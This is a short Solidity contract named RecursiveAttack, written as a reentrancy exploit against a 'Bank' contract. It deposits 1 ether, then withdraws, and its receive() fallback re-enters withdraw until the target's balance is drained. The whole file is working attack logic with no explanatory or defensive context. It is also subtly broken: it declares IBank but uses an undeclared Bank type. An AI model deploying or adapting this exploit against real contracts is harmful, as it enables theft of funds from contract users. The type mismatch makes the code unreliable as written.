interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract RecursiveAttack {
    Bank public targetBank;
    address public attackerAddress;

    constructor(address _targetBank) {
        targetBank = Bank(_targetBank);
        attackerAddress = msg.sender;
    }

    receive() external payable {
        if (address(targetBank).balance >= 1 ether) {
            targetBank.withdraw(1 ether);
        }
    }

    function beginAttack() external payable {
        require(msg.value >= 1 ether);
        targetBank.deposit{value: 1 ether}();
        targetBank.withdraw(1 ether);
    }
}